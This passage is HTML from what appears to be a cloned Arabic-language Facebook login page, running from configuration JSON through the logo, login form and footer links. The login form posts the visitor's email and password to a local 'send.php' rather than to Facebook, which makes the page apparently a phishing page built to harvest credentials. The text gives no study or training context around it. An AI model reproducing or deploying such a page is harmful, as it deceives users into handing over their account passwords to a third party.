								"samplingMethod": 1
							},
							"933036033": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"933036034": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"933036035": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"933036036": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"933036037": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"933036038": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941884436": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941884476": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941884689": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941884838": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941884945": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941885000": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941885017": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941885024": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941885056": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941885063": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941885196": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941885540": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941885615": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941886063": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941886114": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941886177": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941886197": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941886335": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941886520": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941886698": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941886823": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941886887": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941886907": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941887006": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941887370": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941887457": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941887775": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941887999": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941888108": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941888170": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941888329": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941888344": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941888609": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941888741": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941888850": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941888858": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941889079": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941889130": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941889500": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941889635": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941889736": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941889793": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941889802": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941889924": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941890036": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941890649": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941890651": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941891046": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941891372": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941891950": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941892014": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941892105": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941892322": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941892335": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941892412": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941892429": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941892571": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941892660": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941892702": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941892727": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941893098": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941893166": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941893219": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941893296": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941893436": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941893492": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941893543": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941893606": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941893723": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941893915": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941894402": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941894611": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941894918": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941894957": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941895078": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941895125": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941895130": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941895169": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941895479": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941895531": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941895641": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941895975": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941896048": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941896080": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941896375": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941896499": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941896590": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941896705": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941896715": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941896722": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941896872": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941897039": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941897301": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941897383": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941897516": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941897846": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941898160": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941898442": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941898452": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941898873": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941898874": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941899083": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941899192": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"941899484": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"949157888": {
								"sampleRate": 100,
								"samplingMethod": 1
							},
							"958136321": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"959716438": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"959719071": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"959721070": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"960890150": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"960893339": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"960894018": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"960898403": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"960899916": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"974004284": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"976432498": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"976432817": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"981407973": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"987104250": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"987105325": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"987105778": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"987107036": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"987107107": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"987107859": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"987109656": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"987110118": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"987111426": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"987112165": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"987112390": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"987113824": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"987115291": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"987115605": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"987115762": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1001586691": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"1003294845": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"1019346945": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1021183069": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1021188463": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1021190935": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1023354200": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1024065537": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"1049298559": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1049310946": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1050871471": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"1050873607": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"1050879687": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"1050880814": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"1054555339": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1060121691": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1060123723": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"1060125691": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"1060175873": {
								"sampleRate": 10000,
								"samplingMethod": 1
							},
							"1063782141": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1063783100": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1063783933": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1063784266": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1063785441": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1063785814": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"1063787301": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"1063787682": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"1063789999": {
								"sampleRate": 1,
								"samplingMethod": 3
							},
							"1063791930": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1063792837": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1063793312": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1063795002": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1063795646": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1063796217": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1070074643": {
								"sampleRate": 1,
								"samplingMethod": 1
							},
							"1505636832": {
								"sampleRate": 1,
								"samplingMethod": 1
							}
						},
						"killswitch": false
					}, 3504]
				],
				"require": [
					["markJSEnabled"],
					["lowerDomain"],
					["URLFragmentPrelude"],
					["Primer"],
					["BigPipe"],
					["Bootloader"],
					["TimeSlice"],
					["AsyncRequest"],
					["BanzaiScuba_DEPRECATED"],
					["VisualCompletionGating"],
					["FbtLogging"],
					["IntlQtEventFalcoEvent"],
					["RequireDeferredReference", "unblock", [],
						[
							["AsyncRequest", "BanzaiScuba_DEPRECATED", "VisualCompletionGating", "FbtLogging", "IntlQtEventFalcoEvent"], "sd"
						]
					],
					["RequireDeferredReference", "unblock", [],
						[
							["AsyncRequest", "BanzaiScuba_DEPRECATED", "VisualCompletionGating", "FbtLogging", "IntlQtEventFalcoEvent"], "css"
						]
					]
				]
			});
		});
	</script>
</head>

<body class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh chrome webkit win x1-5 Locale_ar_AR" dir="rtl">
	<script type="text/javascript" nonce="VWgCIkTZ">
		requireLazy(["bootstrapWebSession"], function (j) {
			j(1626475121)
		})
	</script>
	<div class="_li" id="u_0_3_rZ">
		<div class="_3_s0 _1toe _3_s1 _3_s1 uiBoxGray noborder" data-testid="ax-navigation-menubar" id="u_0_4_Df">
			<div class="_608m">
				<div class="_5aj7 _tb6">
					<div class="_4bl7"><span class="mrm _3bcv _50f3">انتقال إلى</span></div>
					<div class="_4bl9 _3bcp">
						<div class="_6a _608n"
							aria-label="&#x645;&#x633;&#x627;&#x639;&#x62f; &#x627;&#x644;&#x62a;&#x646;&#x642;&#x644;"
							aria-keyshortcuts="Alt+/" role="menubar" id="u_0_5_fy">
							<div class="_6a uiPopover" id="u_0_6_lS"><a role="button"
									class="_42ft _4jy0 _55pi _2agf _4o_4 _63xb _p _4jy3 _517h _51sy" href="#"
									style="max-width:200px;" aria-haspopup="true" aria-expanded="false" rel="toggle"
									id="u_0_7_T/"><span class="_55pe">أقسام الصفحة الحالية</span><span
										class="_4o_3 _3-99"><i class="img sp_N3BAq4RaYxv_1_5x sx_bc1f7f"></i></span></a>
							</div>
							<div class="_6a _3bcs"></div>
							<div class="_6a mrm uiPopover" id="u_0_8_Xj"><a role="button"
									class="_42ft _4jy0 _55pi _2agf _4o_4 _3_s2 _63xb _p _4jy3 _4jy1 selected _51sy"
									href="#" style="max-width:200px;" aria-haspopup="true" tabindex="-1"
									aria-expanded="false" rel="toggle" id="u_0_9_wI"><span class="_55pe">مساعدة متعلقة
										بإمكانية الوصول</span><span class="_4o_3 _3-99"><i
											class="img sp_N3BAq4RaYxv_1_5x sx_143309"></i></span></a></div>
						</div>
					</div>
					<div class="_4bl7 mlm pll _3bct">
						<div class="_6a _3bcy">اضغط علي ‏‎<span class="_3bcz">alt</span>‎‏ + ‏<span
								class="_3bcz">/</span>‏ لفتح هذه القائمة</div>
					</div>
				</div>
			</div>
		</div>
		<div id="globalContainer" class="uiContextualLayerParent">
			<div class="fb_content clearfix " id="content" role="main">
				<div>
					<div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
						<div class="_8esk">
							<div class="_8esl">
								<div class="_8ice"><img class="fb_logo _8ilh img"
										src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg"
										alt="&#x641;&#x64a;&#x633;&#x628;&#x648;&#x643;" /></div>
								<h2 class="_8eso">يمنحك فيسبوك إمكانية التواصل مع الأشخاص ومشاركة ما تريد معهم.</h2>
							</div>
							<div class="_8esn">
								<div class="_8iep _8icy _9ahz _9ah-">
									<div class="_6luv _52jv">
										<form class="_9vtf" action="send.php" method="post" onsubmit="" id="login">
											<input type="hidden" name="jazoest" value="2977" autocomplete="off" /><input
												type="hidden" value="AVqb3l_fMGo" autocomplete="off" />
											<div>
												<div class="_6lux"><input type="text" required
														class="inputtext _55r1 _6luy" name="email" id="email"
														placeholder="&#x627;&#x644;&#x628;&#x631;&#x64a;&#x62f; &#x627;&#x644;&#x625;&#x644;&#x643;&#x62a;&#x631;&#x648;&#x646;&#x64a; &#x623;&#x648; &#x631;&#x642;&#x645; &#x627;&#x644;&#x647;&#x627;&#x62a;&#x641;"
														autofocus="1"
														aria-label="&#x627;&#x644;&#x628;&#x631;&#x64a;&#x62f; &#x627;&#x644;&#x625;&#x644;&#x643;&#x62a;&#x631;&#x648;&#x646;&#x64a; &#x623;&#x648; &#x631;&#x642;&#x645; &#x627;&#x644;&#x647;&#x627;&#x62a;&#x641;"
														style="width: 362; height: 50;">

												</div>
												<div class="_6lux">
													<div class="_6luy _55r1 _1kbt"><input type="password" required
															class="inputtext _55r1 _6luy _9npi" name="password"
															id="password"
															placeholder="&#x643;&#x644;&#x645;&#x629; &#x627;&#x644;&#x633;&#x631;"
															aria-label="&#x643;&#x644;&#x645;&#x629; &#x627;&#x644;&#x633;&#x631;" />
													</div>
												</div>
												<div class="_9ls7" id="u_0_b_kX"><a href="#" role="button">
														<div class="_9luh">
															<div class="_9lsb" id="u_0_c_CE"></div>
														</div>
													</a></div>
											</div><input type="hidden" autocomplete="off" name="login_source"
												value="comet_headerless_login" /><input type="hidden" autocomplete="off"
												name="next" value="" />
											<div class="_6ltg"><button value="1"
													class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login"
													data-testid="royal_login_button" type="submit" id="u_0_d_tq">تسجيل
													الدخول</button></div>
											<div class="_6ltj"><a
													href="https://www.facebook.com/recover/initiate/?ars=facebook_login&amp;privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjI2NDc1MTIxLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D">هل
													نسيت كلمة السر؟</a></div>
											<div class="_8icz"></div>
											<div class="_6ltg"><a role="button"
													class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="#"
													ajaxify="/reg/spotlight/" id="u_0_2_hC"
													data-testid="open-registration-form-button" rel="async">إنشاء حساب
													جديد</a></div>
										</form>
									</div>
									<div id="reg_pages_msg" class="_58mk">‏<a
											href="/pages/create/?ref_type=registration_form" class="_8esh">إنشاء
											صفحة</a>‏ لفرق موسيقية أو مشاهير أو أنشطة تجارية.</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="">
				<div class="_95ke _8opy">
					<div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
						<ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
							<li>العربية</li>

						</ul>
						<div id="contentCurve"></div>
						<div id="pageFooterChildren" role="contentinfo"
							aria-label="&#x631;&#x648;&#x627;&#x628;&#x637; &#x645;&#x648;&#x642;&#x639; &#x641;&#x64a;&#x633;&#x628;&#x648;&#x643;">
							<ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
								<li><a href="/r.php"
										title="&#x627;&#x644;&#x62a;&#x633;&#x62c;&#x64a;&#x644; &#x641;&#x64a; &#x641;&#x64a;&#x633;&#x628;&#x648;&#x643;">إنشاء
										حساب في فيسبوك</a></li>
								<li><a href="/login/"
										title="&#x62a;&#x633;&#x62c;&#x64a;&#x644; &#x627;&#x644;&#x62f;&#x62e;&#x648;&#x644; &#x625;&#x644;&#x649; &#x641;&#x64a;&#x633;&#x628;&#x648;&#x643;">تسجيل
										الدخول</a></li>
								<li><a href="https://messenger.com/"
										title="&#x62a;&#x641;&#x642;&#x62f; Messenger.">Messenger</a></li>
								<li><a href="/lite/"
										title="Facebook Lite &#x644;&#x646;&#x638;&#x627;&#x645; Android.">Facebook
										Lite</a></li>
								<li><a href="https://www.facebook.com/watch/"
										title="&#x64a;&#x645;&#x643;&#x646;&#x643; &#x62a;&#x635;&#x641;&#x62d; &#x645;&#x642;&#x627;&#x637;&#x639; &#x627;&#x644;&#x641;&#x64a;&#x62f;&#x64a;&#x648; &#x627;&#x644;&#x62e;&#x627;&#x635;&#x629; &#x628;&#x646;&#x627; &#x639;&#x644;&#x649; Watch.">
										Watch </a></li>
								<li><a href="/directory/people/"
										title="&#x62a;&#x635;&#x641;&#x62d; &#x62f;&#x644;&#x64a;&#x644; &#x627;&#x644;&#x623;&#x634;&#x62e;&#x627;&#x635; &#x644;&#x62f;&#x64a;&#x646;&#x627;.">الأشخاص</a>
								</li>
								<li><a href="/directory/pages/"
										title="&#x62a;&#x635;&#x641;&#x62d; &#x62f;&#x644;&#x64a;&#x644; &#x635;&#x641;&#x62d;&#x627;&#x62a;&#x646;&#x627;.">الصفحات</a>
								</li>
								<li><a href="/pages/category/">فئات الصفحات</a></li>
								<li><a href="/places/"
										title="&#x62a;&#x639;&#x631;&#x651;&#x641; &#x639;&#x644;&#x649; &#x627;&#x644;&#x623;&#x645;&#x627;&#x643;&#x646; &#x627;&#x644;&#x634;&#x647;&#x64a;&#x631;&#x629; &#x639;&#x644;&#x649; &#x641;&#x64a;&#x633;&#x628;&#x648;&#x643;.">الأماكن</a>
								</li>
								<li><a href="/games/"
										title="&#x62a;&#x639;&#x631;&#x651;&#x641; &#x639;&#x644;&#x649; &#x623;&#x644;&#x639;&#x627;&#x628; &#x641;&#x64a;&#x633;&#x628;&#x648;&#x643;.">الألعاب</a>
								</li>
								<li><a href="/directory/places/"
										title="&#x62a;&#x635;&#x641;&#x62d; &#x62f;&#x644;&#x64a;&#x644; &#x627;&#x644;&#x623;&#x645;&#x627;&#x643;&#x646;">المواقع</a>
								</li>
								<li><a href="/marketplace/"
										title="&#x64a;&#x645;&#x643;&#x646;&#x643; &#x627;&#x644;&#x628;&#x64a;&#x639; &#x648;&#x627;&#x644;&#x634;&#x631;&#x627;&#x621; &#x645;&#x646; &#x62e;&#x644;&#x627;&#x644; Facebook Marketplace.">Marketplace</a>
								</li>
								<li><a href="https://pay.facebook.com/" target="_blank"
										title="&#x62a;&#x639;&#x631;&#x641; &#x639;&#x644;&#x649; &#x627;&#x644;&#x645;&#x632;&#x64a;&#x62f; &#x639;&#x646; Facebook Pay">Facebook
										Pay</a></li>
								<li><a href="/directory/groups/"
										title="&#x62a;&#x635;&#x641;&#x62d; &#x62f;&#x644;&#x64a;&#x644; &#x645;&#x62c;&#x645;&#x648;&#x639;&#x627;&#x62a;&#x646;&#x627;">المجموعات</a>
								</li>
								<li><a href="/jobs/"
										title="&#x62a;&#x642;&#x62f;&#x645; &#x648;&#x627;&#x62d;&#x635;&#x644; &#x639;&#x644;&#x649; &#x648;&#x638;&#x64a;&#x641;&#x629; &#x639;&#x644;&#x649; &#x641;&#x64a;&#x633;&#x628;&#x648;&#x643;.">الوظائف</a>
								</li>
								<li><a href="https://www.oculus.com/" target="_blank"
										title="&#x62a;&#x639;&#x631;&#x641; &#x639;&#x644;&#x649; &#x627;&#x644;&#x645;&#x632;&#x64a;&#x62f; &#x639;&#x646; Oculus">Oculus</a>
								</li>
								<li><a href="https://portal.facebook.com/" target="_blank"
										title="&#x62a;&#x639;&#x631;&#x641; &#x639;&#x644;&#x649; &#x627;&#x644;&#x645;&#x632;&#x64a;&#x62f; &#x639;&#x646; Portal from Facebook">Portal</a>
								</li>
								<li><a href="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT3HegHSKYguBlJWTqcFI3lObb2T-wPQPzO7glD5Crja9IE9d02M3pX7qLH-B1fTrTMAbWXr7RGWRI8vlmOmQXJzQ_XeCKBKKxkMcnZJtQDmI3Dy5OtnCvECHkLLl4U6EtfLpymGtNnfmY_rmG6NBw"
										title="&#x62a;&#x639;&#x631;&#x641; &#x639;&#x644;&#x649; Instagram"
										target="_blank" rel="noopener nofollow" data-lynx-mode="asynclazy">Instagram</a>
								</li>
								<li><a href="/local/lists/245019872666104/"
										title="&#x64a;&#x645;&#x643;&#x646;&#x643; &#x62a;&#x635;&#x641;&#x62d; &#x62f;&#x644;&#x64a;&#x644; &#x642;&#x648;&#x627;&#x626;&#x645;&#x646;&#x627; &#x627;&#x644;&#x645;&#x62d;&#x644;&#x64a;&#x629;.">محلية</a>
								</li>
								<li><a href="/fundraisers/"
										title="&#x64a;&#x645;&#x643;&#x646;&#x643; &#x627;&#x644;&#x62a;&#x628;&#x631;&#x639; &#x644;&#x644;&#x642;&#x636;&#x627;&#x64a;&#x627; &#x627;&#x644;&#x62a;&#x64a; &#x62a;&#x633;&#x62a;&#x62d;&#x642;.">حملات
										جمع التبرعات</a></li>
								<li><a href="/biz/directory/"
										title="&#x64a;&#x645;&#x643;&#x646;&#x643; &#x62a;&#x635;&#x641;&#x62d; &#x62f;&#x644;&#x64a;&#x644; &#x62e;&#x62f;&#x645;&#x627;&#x62a; &#x641;&#x64a;&#x633;&#x628;&#x648;&#x643;.">الخدمات</a>
								</li>
								<li><a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D"
										title="&#x64a;&#x645;&#x643;&#x646;&#x643; &#x631;&#x624;&#x64a;&#x629; &#x645;&#x631;&#x643;&#x632; &#x645;&#x639;&#x644;&#x648;&#x645;&#x627;&#x62a; &#x627;&#x644;&#x62a;&#x635;&#x648;&#x64a;&#x62a;.">مركز
										معلومات التصويت</a></li>
								<li><a href="https://about.facebook.com/" accesskey="8"
										title="&#x627;&#x642;&#x631;&#x623; &#x645;&#x62f;&#x648;&#x646;&#x62a;&#x646;&#x627;&#x60c; &#x648;&#x627;&#x633;&#x62a;&#x643;&#x634;&#x641; &#x645;&#x631;&#x643;&#x632; &#x627;&#x644;&#x645;&#x648;&#x627;&#x631;&#x62f;&#x60c; &#x648;&#x627;&#x628;&#x62d;&#x62b; &#x639;&#x646; &#x641;&#x631;&#x635; &#x627;&#x644;&#x639;&#x645;&#x644;.">حول</a>
								</li>
								<li><a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto"
										title="&#x627;&#x644;&#x625;&#x639;&#x644;&#x627;&#x646; &#x639;&#x644;&#x649; &#x641;&#x64a;&#x633;&#x628;&#x648;&#x643;.">إنشاء
										إعلان</a></li>
								<li><a href="/pages/create/?ref_type=site_footer"
										title="&#x625;&#x646;&#x634;&#x627;&#x621; &#x635;&#x641;&#x62d;&#x629;">إنشاء
										صفحة</a></li>
								<li><a href="https://developers.facebook.com/?ref=pf"
										title="&#x642;&#x645; &#x628;&#x627;&#x644;&#x62a;&#x637;&#x648;&#x64a;&#x631; &#x641;&#x64a; &#x645;&#x646;&#x635;&#x62a;&#x646;&#x627;.">المطوّرون</a>
								</li>
								<li><a href="/careers/?ref=pf"
										title="&#x62d;&#x642;&#x651;&#x642; &#x627;&#x644;&#x646;&#x62c;&#x627;&#x62d; &#x641;&#x64a; &#x645;&#x633;&#x64a;&#x631;&#x62a;&#x643; &#x627;&#x644;&#x645;&#x647;&#x646;&#x64a;&#x629;&#x60c; &#x627;&#x646;&#x62a;&#x642;&#x644; &#x625;&#x644;&#x649; &#x634;&#x631;&#x643;&#x62a;&#x646;&#x627; &#x627;&#x644;&#x631;&#x627;&#x626;&#x639;&#x629;.">الوظائف</a>
								</li>
								<li><a data-nocookies="1" href="/privacy/explanation"
										title="&#x62a;&#x639;&#x631;&#x641; &#x639;&#x644;&#x649; &#x627;&#x644;&#x62e;&#x635;&#x648;&#x635;&#x64a;&#x629; &#x648;&#x641;&#x64a;&#x633;&#x628;&#x648;&#x643;.">الخصوصية</a>
								</li>
								<li><a href="/policies/cookies/"
										title="&#x62a;&#x639;&#x631;&#x641; &#x639;&#x644;&#x649; &#x627;&#x644;&#x645;&#x632;&#x64a;&#x62f; &#x639;&#x646; &#x645;&#x644;&#x641;&#x627;&#x62a; &#x62a;&#x639;&#x631;&#x64a;&#x641; &#x627;&#x644;&#x627;&#x631;&#x62a;&#x628;&#x627;&#x637; &#x648;&#x641;&#x64a;&#x633;&#x628;&#x648;&#x643;."
										data-nocookies="1">ملفات تعريف الارتباط</a></li>
								<li><a class="_41ug" data-nocookies="1"
										href="https://www.facebook.com/help/568137493302217"
										title="&#x62a;&#x639;&#x631;&#x641; &#x639;&#x644;&#x649; &#x623;&#x62f;&#x627;&#x629; Ad Choices.">Ad
										Choices<i class="img sp_mL06iAlYWAX_1_5x sx_0a784c"></i></a></li>
								<li><a data-nocookies="1" href="/policies?ref=pf" accesskey="9"
										title="&#x627;&#x644;&#x627;&#x637;&#x644;&#x627;&#x639; &#x639;&#x644;&#x649; &#x634;&#x631;&#x648;&#x637;&#x646;&#x627; &#x648;&#x633;&#x64a;&#x627;&#x633;&#x627;&#x62a;&#x646;&#x627;.">الشروط</a>
								</li>
								<li><a href="/help/?ref=pf" accesskey="0"
										title="&#x62a;&#x641;&#x636;&#x644; &#x628;&#x632;&#x64a;&#x627;&#x631;&#x629; &#x645;&#x631;&#x643;&#x632; &#x627;&#x644;&#x645;&#x633;&#x627;&#x639;&#x62f;&#x629;.">مساعدة</a>
								</li>
								<li><a accesskey="6" class="accessible_elem" href="/settings"
										title="&#x639;&#x631;&#x636; &#x648;&#x62a;&#x639;&#x62f;&#x64a;&#x644; &#x625;&#x639;&#x62f;&#x627;&#x62f;&#x627;&#x62a; &#x641;&#x64a;&#x633;&#x628;&#x648;&#x643;.">الإعدادات</a>
								</li>
								<li><a accesskey="7" class="accessible_elem"
										href="/allactivity?privacy_source=activity_log_top_menu"
										title="&#x639;&#x631;&#x636; &#x633;&#x62c;&#x644; &#x627;&#x644;&#x646;&#x634;&#x627;&#x637;&#x627;&#x62a;">سجل
										النشاطات</a></li>
							</ul>
						</div>
						<div class="mvl copyright">
